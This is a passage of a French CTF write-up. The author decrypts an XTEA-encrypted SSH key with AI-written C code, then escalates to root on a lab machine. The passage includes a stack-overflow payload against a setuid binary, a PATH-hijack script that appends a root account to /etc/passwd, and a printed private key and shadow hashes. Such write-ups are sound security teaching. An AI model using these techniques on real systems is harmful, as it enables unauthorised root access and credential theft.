00000000  a0 7f d0 85 51 e2 a1 f7  a0 7f d0 85 51 e2 a1 f7  |....Q.......Q...|
*
00000020  a0 7f d0 85 51 e2 a1 f7                           |....Q...|
```

On voit qu'en sortie, un pattern de 8 octets se répète. On est donc face à un chiffrement par bloc non chaîné (un bloc n'est pas chiffré à l'aide du bloc précédent), aka le mode ECB.

Si je renomme `output.env` en `id_ed25519` et que je relance le programme, je ne retrouve pas mon texte initial, l'algorithme n'est donc pas réversible (ce n'est pas un XOR avec une clé).

Une recherche sur `crypt` révèle la nature de l'algo utilisé :

```console
$ strings userLogin  | grep -i crypt
encrypt_file
xtea_encrypt
```

J'ai chargé le binaire dans [Cutter](https://cutter.re/). La logique commence vraiment dans `encrypt_file` :

```nasm
int main(int argc, char **argv, char **envp);
0x00401bf1      push    rbp
0x00401bf2      mov     rbp, rsp
0x00401bf5      mov     eax, 0
0x00401bfa      call    encrypt_file ; sym.encrypt_file
0x00401bff      mov     eax, 0
0x00401c04      pop     rbp
0x00401c05      ret
```

`encrypt_file` commence par ouvrir les deux fichiers puis appelle une fonction `key_from_fixed_string`.

```nasm
key_from_fixed_string(int64_t arg1);
; arg int64_t arg1 @ rdi
; var int64_t var_20h @ stack - 0x20
; var int64_t var_ch @ stack - 0xc
0x004019fb      push    rbp
0x004019fc      mov     rbp, rsp
0x004019ff      mov     qword [var_20h], rdi ; arg1
0x00401a03      mov     dword [var_ch], 0
0x00401a0a      jmp     0x401a9d
0x00401a0f      mov     eax, dword [var_ch]
0x00401a12      shl     eax, 2
0x00401a15      cdqe
0x00401a17      lea     rdx, FIXED_KEY_STR ; 0x479010
0x00401a1e      movzx   eax, byte [rax + rdx]
0x00401a22      movsx   edx, al
0x00401a25      mov     eax, dword [var_ch]
0x00401a28      shl     eax, 2
0x00401a2b      add     eax, 1
0x00401a2e      cdqe
; --- snip ---
```

On voit une référence à une chaine qui vaut `key-for-user-ldzid_ed25519` mais XTEA a besoin d'une clé de 16 octets donc seulement le début est utilisé..

Je ne mets pas le code de `xtea_encrypt` en entier, mais on peut voir la valeur `0x9e3779b9` qui est classique avec cet algorithme.

```nasm
xtea_encrypt(int64_t arg1, int64_t arg2);
; arg int64_t arg1 @ rdi
; arg int64_t arg2 @ rsi
; var int64_t var_38h @ stack - 0x38
; var int64_t var_30h @ stack - 0x30
; var int64_t var_1ch @ stack - 0x1c
; var int64_t var_18h @ stack - 0x18
; var int64_t var_14h @ stack - 0x14
; var int64_t var_10h @ stack - 0x10
; var int64_t var_ch @ stack - 0xc
0x00401925      push    rbp
0x00401926      mov     rbp, rsp
0x00401929      mov     qword [var_30h], rdi ; arg1
0x0040192d      mov     qword [var_38h], rsi ; arg2
0x00401931      mov     rax, qword [var_30h]
0x00401935      mov     eax, dword [rax]
0x00401937      mov     dword [var_ch], eax
0x0040193a      mov     rax, qword [var_30h]
0x0040193e      mov     eax, dword [rax + 4]
0x00401941      mov     dword [var_10h], eax
0x00401944      mov     dword [var_14h], 0
0x0040194b      mov     dword [var_1ch], 0x9e3779b9
0x00401952      mov     dword [var_18h], 0
; --- snip ---
```

Si on regarde la page [Wikipédia](https://fr.wikipedia.org/wiki/XTEA), on voit que les implémentations reçoivent souvent trois paramètres :

- le bloc à chiffrer

- la clé

- le nombre d'itérations

Ici la fonction n'a que deux paramètres (le bloc et la clé, confirmé avec `gdb`). Mais on trouve dans la fonction une variable incrémentée qui s'arrête au boût d'un moment :

```nasm
0x004019d4      add     dword [var_18h], 1
0x004019d8      cmp     dword [var_18h], 0x3f
0x004019dc      jle     0x40195b
```

`0x3f` correspond à 63, ce qui signifie que l'on a 64 itérations.

J'ai passé le code de `encrypt_file`, `xtea_encrypt` et `key_from_fixed_string` à `Gemini AI`. Il m'a écrit un code pour le déchiffrement :

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

// --- XTEA Constants ---
#define XTEA_BLOCK_SIZE 8 // 64 bits
#define XTEA_KEY_SIZE   16 // 128 bits
#define XTEA_ROUNDS     64
#define XTEA_DELTA      0x9E3779B9

// --- Padding Functions (Null padding) ---
void null_pad(unsigned char **data, size_t *len) {
    size_t block_size = XTEA_BLOCK_SIZE;
    size_t padding_len = block_size - (*len % block_size);
    if (padding_len == block_size) { // If already a multiple, no padding needed according to original assembly
        return;
    }

    *data = (unsigned char *)realloc(*data, *len + padding_len);
    if (*data == NULL) {
        perror("realloc failed during padding");
        exit(EXIT_FAILURE);
    }
    memset(*data + *len, 0x00, padding_len);
    *len += padding_len;
}

void null_unpad(unsigned char **data, size_t *len) {
    if (*len == 0) return;
    size_t original_len = *len;
    while (original_len > 0 && (*data)[original_len - 1] == 0x00) {
        original_len--;
    }
    *len = original_len;
}

// --- Convert bytes to uint32_t array (LITTLE-ENDIAN) ---
void bytes_to_uint32_le(const unsigned char *input, uint32_t *output, size_t num_uint32) {
    for (size_t i = 0; i < num_uint32; i++) {
        output[i] = ((uint32_t)input[i*4 + 3] << 24) |
                    ((uint32_t)input[i*4 + 2] << 16) |
                    ((uint32_t)input[i*4 + 1] << 8)  |
                    ((uint32_t)input[i*4 + 0] << 0);
    }
}

// --- Convert uint32_t array to bytes (LITTLE-ENDIAN) ---
void uint32_to_bytes_le(const uint32_t *input, unsigned char *output, size_t num_uint32) {
    for (size_t i = 0; i < num_uint32; i++) {
        output[i*4 + 3] = (unsigned char)((input[i] >> 24) & 0xFF);
        output[i*4 + 2] = (unsigned char)((input[i] >> 16) & 0xFF);
        output[i*4 + 1] = (unsigned char)((input[i] >> 8)  & 0xFF);
        output[i*4 + 0] = (unsigned char)((input[i] >> 0)  & 0xFF);
    }
}

// --- XTEA CORE FUNCTIONS ---
void xtea_encrypt_block(uint32_t *v, const uint32_t *k) {
    uint32_t v0 = v[0], v1 = v[1];
    uint32_t sum = 0;
    uint32_t delta = XTEA_DELTA;

    for (int i = 0; i < XTEA_ROUNDS; i++) {
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum & 3]);
        sum += delta;
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum >> 11) & 3]);
    }
    v[0] = v0;
    v[1] = v1;
}

// !!! CRITICAL: REPLICATE THE BINARY'S ACTUAL DECRYPT LOGIC HERE !!!
// This is the STANDARD XTEA DECRYPT. It still needs to be verified against binary's xtea_decrypt.
void xtea_decrypt_block(uint32_t *v, const uint32_t *k) {
    uint32_t v0 = v[0], v1 = v[1];
    uint32_t delta = XTEA_DELTA;
    uint32_t sum = delta * XTEA_ROUNDS; 

    for (int i = 0; i < XTEA_ROUNDS; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum >> 11) & 3]);
        sum -= delta;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum & 3]);
    }
    v[0] = v0;
    v[1] = v1;
}

// --- Main Encryption/Decryption Functions ---
void encrypt_file_xtea_ecb(const char *input_filename, const char *output_filename, const unsigned char *key_bytes) {
    FILE *in_fp = NULL;
    FILE *out_fp = NULL;
    unsigned char *plaintext_raw = NULL;
    size_t plaintext_len = 0;
    uint32_t block_u32[2];
    uint32_t key_u32[4];
    
    bytes_to_uint32_le(key_bytes, key_u32, 4);

    in_fp = fopen(input_filename, "rb");
    if (!in_fp) { perror("Error opening input file for encryption"); return; }

    fseek(in_fp, 0, SEEK_END);
    plaintext_len = ftell(in_fp);
    fseek(in_fp, 0, SEEK_SET);

    plaintext_raw = (unsigned char *)malloc(plaintext_len);
    if (!plaintext_raw) { perror("Failed to allocate memory"); fclose(in_fp); return; }
    fread(plaintext_raw, 1, plaintext_len, in_fp);
    fclose(in_fp);

    size_t padded_len = plaintext_len;
    null_pad(&plaintext_raw, &padded_len);

    out_fp = fopen(output_filename, "wb");
    if (!out_fp) { perror("Error opening output file for encryption"); free(plaintext_raw); return; }

    for (size_t i = 0; i < padded_len; i += XTEA_BLOCK_SIZE) {
        bytes_to_uint32_le(&plaintext_raw[i], block_u32, 2);
        xtea_encrypt_block(block_u32, key_u32);
        uint32_to_bytes_le(block_u32, &plaintext_raw[i], 2);
    }
    fwrite(plaintext_raw, 1, padded_len, out_fp);
    printf("File encrypted and saved to: %s\n", output_filename);
    fclose(out_fp);
    free(plaintext_raw);
}

void decrypt_file_xtea_ecb(const char *input_filename, const char *output_filename, const unsigned char *key_bytes) {
    FILE *in_fp = NULL;
    FILE *out_fp = NULL;
    unsigned char *ciphertext_raw = NULL;
    size_t ciphertext_len = 0;
    uint32_t block_u32[2];
    uint32_t key_u32[4];

    bytes_to_uint32_le(key_bytes, key_u32, 4);

    in_fp = fopen(input_filename, "rb");
    if (!in_fp) { perror("Error opening input file for decryption"); return; }

    fseek(in_fp, 0, SEEK_END);
    ciphertext_len = ftell(in_fp);
    fseek(in_fp, 0, SEEK_SET);

    ciphertext_raw = (unsigned char *)malloc(ciphertext_len);
    if (!ciphertext_raw) { perror("Failed to allocate memory"); fclose(in_fp); return; }
    fread(ciphertext_raw, 1, ciphertext_len, in_fp);
    fclose(in_fp);

    if (ciphertext_len % XTEA_BLOCK_SIZE != 0) {
        fprintf(stderr, "Warning: Ciphertext length is not a multiple of block size. Data might be truncated.\n");
    }

    for (size_t i = 0; i < ciphertext_len; i += XTEA_BLOCK_SIZE) {
        bytes_to_uint32_le(&ciphertext_raw[i], block_u32, 2);
        xtea_decrypt_block(block_u32, key_u32);
        uint32_to_bytes_le(block_u32, &ciphertext_raw[i], 2);
    }

    size_t unpadded_len = ciphertext_len;
    null_unpad(&ciphertext_raw, &unpadded_len);

    out_fp = fopen(output_filename, "wb");
    if (!out_fp) { perror("Error opening output file for decryption"); free(ciphertext_raw); return; }
    fwrite(ciphertext_raw, 1, unpadded_len, out_fp);
    printf("Decrypted file saved to: %s\n", output_filename);

    fclose(out_fp);
    free(ciphertext_raw);
}

// --- Main Program ---
int main() {
    // IMPORTANT: Verify the exact bytes of FIXED_KEY_STR at 0x479010 in your binary.
    // It is highly likely to be "key-for-user-ldz" as a 16-byte ASCII string.
    const unsigned char xtea_key[XTEA_KEY_SIZE] = "key-for-user-ldz"; 

    const char *encrypted_input_file = "output.enc";
    const char *decrypted_output_file = "clear.txt";
    const char *test_plaintext_file = "test_plaintext.txt";

    decrypt_file_xtea_ecb(encrypted_input_file, decrypted_output_file, xtea_key);

    return 0;
}
```

J'obtiens alors la clé SSH attendue :

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDG60tqgYFFVx4ClSFGSIVssmKW6ibCoViuF9E8HQayZgAAAJBa9KyZWvSs
mQAAAAtzc2gtZWQyNTUxOQAAACDG60tqgYFFVx4ClSFGSIVssmKW6ibCoViuF9E8HQayZg
AAAEDkh1u30NCdjW5cB2TK+hkOBod+D7EKn6vZPHcyHL/ljMbrS2qBgUVXHgKVIUZIhWyy
YpbqJsKhWK4X0TwdBrJmAAAADWxkekBsb2NhbGhvc3Q=
-----END OPENSSH PRIVATE KEY-----
```

### Sugar

Cette fois, on peut se connecter sur l'hôte ; on touche au but.

```console
$ ssh -i clear.txt ldz@192.168.56.139

localhost:~$ id
uid=1000(ldz) gid=1000(ldz) groups=1000(ldz)
localhost:~$ sudo -l
-sh: sudo: not found
localhost:~$ find / -type f -perm -u+s 2> /dev/null 
/opt/vuln
/bin/bbsuid
```

`bbsuid` est un binaire légitime que l'on croise sur les systèmes avec `busybox`.

On se concentre donc sur l'autre binaire setuid `root`. Voici le code désassemblé :

```nasm
  ;-- secret:
void dbg.secret();
0x004011ad      push    rbp        ; void secret();
0x004011ae      mov     rbp, rsp
0x004011b1      mov     edi, 0
0x004011b6      call    setuid     ; sym.imp.setuid
0x004011bb      lea     rax, str.cat__etc_shadow ; segment.LOAD2
                                   ; 0x402000
0x004011c2      mov     rdi, rax   ; const char *string
0x004011c5      call    system     ; sym.imp.system ; int system(const char *string)
0x004011ca      nop
0x004011cb      pop     rbp
0x004011cc      ret
  
  ;-- vuln:
void dbg.vuln();
; var char [32] buffer @ stack - 0x38
; var ssize_t n @ stack - 0x18
; var int flag @ stack - 0xc
0x004011cd      push    rbp        ; void vuln();
0x004011ce      mov     rbp, rsp
0x004011d1      sub     rsp, 0x30
0x004011d5      mov     dword [flag], 0
0x004011dc      lea     rax, [buffer[0]]
0x004011e0      mov     edx, 0x30  ; '0' ; 48 ; size_t nbyte
0x004011e5      mov     rsi, rax   ; void *buf
0x004011e8      mov     edi, 0     ; int fildes
0x004011ed      call    read       ; sym.imp.read ; ssize_t read(int fildes, void *buf, size_t nbyte)
0x004011f2      mov     qword [n], rax
0x004011f6      cmp     dword [flag], 1
0x004011fa      jne     0x401208
0x004011fc      mov     eax, 0
0x00401201      call    dbg.secret ; dbg.secret
0x00401206      jmp     0x401230
0x00401208      mov     eax, dword [flag]
0x0040120b      mov     esi, eax
0x0040120d      lea     rax, str.flag____d ; 0x402010
0x00401214      mov     rdi, rax   ; const char *format
0x00401217      mov     eax, 0
0x0040121c      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x00401221      lea     rax, str.password_wrong ; 0x40201b
0x00401228      mov     rdi, rax   ; const char *s
0x0040122b      call    puts       ; sym.imp.puts ; int puts(const char *s)
0x00401230      nop
0x00401231      leave
0x00401232      ret
```

Il y a une variable nommée `flag` qui est initialisée à `0`. Elle n'est pas modifiée par le code, mais si elle devient `1` alors la fonction `secret` est appellée.

D'après les commentaires ajoutés par `Cutter`, le password lut est stocké à `stack - 0x38`, soit 56 octets dessous le stack pointer. Le flag est à `stack - 0xc` donc `-12`. Il y a `56 - 12` octets qui séparent les deux, soit 44 octets.

Si on écrit 44 octets, la suite écrasera la variable :

```console
localhost:~$ python3 -c 'print("\x00" * 44 + "\x01\x00\x00\x00")' | /opt/vuln
root:$6$W5FUwrTeo8vXfNot$qJazigaYSqk8ezVfjHckZb2XjxkrJsniQa5MA1o.j9apE1BMYX5vYuJVEJ2hYbNsR0q9IWOSSt1I40vNYxvKO0:20263:0:::::
bin:!::0:::::
daemon:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
games:!::0:::::
ntp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
klogd:!:20205:0:99999:7:::
chrony:!:20205:0:99999:7:::
ldz:$6$qCU7eP8wj/Pvo1FB$Ooou6p.TF3M/kMB29XrzQ6XVNbq7c46lGzNvRPOJ55GAXJ0h.jmbc8VHhGjFgwXLHPSbNt96l/rmUYgDqpo8Y0:20263:0:99999:7:::
nginx:!:20263:0:99999:7:::
```

On pouvait s'y attendre : le hash de `root` ne tombe pas avec `rockyou`. On peut exploiter le fait que le binaire appelle la commande `cat` sans chemin absolu :

```console
localhost:~$ echo -e '#!/bin/sh\necho devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh >> /etc/passwd' > cat
localhost:~$ chmod 755 cat
localhost:~$ export PATH=.:$PATH
localhost:~$ python3 -c 'print("\x00" * 44 + "\x01\x00\x00\x00")' | /opt/vuln
localhost:~$ su devloop
Password: 
/home/ldz # cd /root
~ # ls
root.txt
~ # cat root.txt
flag{98ecb90d5dcef41e1bd18f47697f287a}
```

CTF intéressant. J'ai perdu beaucoup de temps à cause de ce statut HTTP 400. Et sans l'aide d'une IA, résoudre la partie déchiffrement aurait été compliqué, en particulier si l'implémentation de XTEA prend quelques libertés sur l'original.
